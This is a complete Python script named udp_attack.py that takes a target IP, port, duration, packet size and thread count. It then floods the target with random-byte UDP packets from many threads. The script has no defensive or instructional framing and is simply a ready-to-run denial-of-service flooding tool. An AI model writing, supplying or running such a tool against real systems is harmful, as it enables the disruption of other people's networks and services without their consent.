import sys
import socket
import threading
import time
import random

def udp_attack(target_ip, target_port, duration, packet_size, num_threads):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    end_time = time.time() + float(duration)
    
    def send_packets():
        while time.time() < end_time:
            client.sendto(bytes, (target_ip, int(target_port)))

    threads = []
    for _ in range(int(num_threads)):
        thread = threading.Thread(target=send_packets)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print("Usage: python udp_attack.py <target_ip> <target_port> <duration> <packet_size> <num_threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    duration = sys.argv[3]
    packet_size = int(sys.argv[4])
    num_threads = int(sys.argv[5])

    udp_attack(target_ip, target_port, duration, packet_size, num_threads)
